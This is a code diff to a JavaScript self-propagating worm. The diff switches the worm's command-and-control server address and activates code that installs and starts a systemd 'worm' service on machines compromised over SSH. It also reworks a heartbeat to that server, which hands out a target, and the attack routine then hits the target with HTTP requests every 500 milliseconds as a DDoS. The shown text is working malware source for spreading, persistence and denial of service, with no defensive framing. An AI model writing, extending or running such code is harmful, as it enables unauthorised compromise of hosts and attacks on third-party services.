@@ -12,7 +12,8 @@ const passwords = [
 ]
 let ipAddress;
 let targetSpecified = false;
-const commandServer = "169.254.213.246:3030";
+let attackInterval;
+const commandServer = "169.254.4.72:3030";
 
 /**
  * Attempts to connect to the remote machine to propagate the worm
@@ -50,16 +51,16 @@ const attemptConnect = async (ipAddress, localIpAddress) => {
                 await ssh.exec('sudo', ['chmod', '755', 'start.sh']);
                 await ssh.exec('sudo', ['mv', 'start.sh', wormDirectory]);
 
-                // // create a system service to run the executable
-                // await ssh.execCommand('echo "[Unit]\nDescription=Echos Hello World\n\n[Service]\nType=simple\nExecStart=/worm/start.sh\n\n[Install]\nWantedBy=multi-user.target" > worm.service');
-                // await ssh.execCommand('sudo mv worm.service /etc/systemd/system');
-                // await ssh.execCommand('sudo systemctl daemon-reload');
+                // create a system service to run the executable
+                await ssh.execCommand('echo "[Unit]\nDescription=Starts Self Propagating Worm\n\n[Service]\nType=simple\nExecStart=/worm/start.sh\n\n[Install]\nWantedBy=multi-user.target" > worm.service');
+                await ssh.execCommand('sudo mv worm.service /etc/systemd/system');
 
-                // // enable the executable to start on restarts
-                // await ssh.execCommand('sudo systemctl enable worm');
+                // enable the executable to start on restarts
+                await ssh.execCommand('sudo systemctl daemon-reload');
+                await ssh.execCommand('sudo systemctl enable worm');
 
-                // // start the executable
-                // await ssh.execCommand('sudo systemctl start worm');
+                // start the executable
+                await ssh.execCommand('sudo systemctl start worm');
             }
             ssh.dispose();
 
@@ -107,10 +108,10 @@ const scan = async (localIpAddress) => {
 const heartbeat = async (localIp) => {
     try {
         const heartbeat = await axios.get(`http://${commandServer}/heartbeat/${localIp}`);
-        if (!targetSpecified && heartbeat.data.target) {
+        if (!targetSpecified && heartbeat.data !== "No Target") {
             targetSpecified = true;
-            attack(heartbeat.data.target);
-        } else {
+            attack(heartbeat.data);
+        } else if (heartbeat.data === "No Target") {
             targetSpecified = false;
         }
     } catch (ex) {
@@ -118,36 +119,23 @@ const heartbeat = async (localIp) => {
     }
 };
 
-
 /**
  * Attacks the specified target with a DDOS attack
  * This will probably be extracted into its own file later
  * @param {string} targetIpAddress ip address of the target 
  */
 const attack = (targetIpAddress) => {
-    const cluster = require('cluster');
-    const numCPUS = os.cpus().length;
-
-    if (cluster.isMaster) {
-        for (let i = 0; i < numCPUS - 1; i++) {
-            cluster.fork();
-        }
-    }
-    else
-        attackTarget(targetIpAddress);
-
-    cluster.on('exit', () => {
-        if (targetSpecified)
-            cluster.fork();
-        else {
-            cluster.removeAllListeners();
-        }
-
-    });
+    console.log('attacking', targetIpAddress);
+    this.attackInterval = setInterval(attackTarget, 500, targetIpAddress);
 }
 
 const attackTarget = async (targetIpAddress) => {
-    await axios.get(targetIpAddress);
+    console.log('attackTarget', targetIpAddress, targetSpecified);
+    attacked = await axios.get(targetIpAddress)
+    if (!targetSpecified) {
+        clearInterval(this.attackInterval);
+    }
+
 }
 
 /**
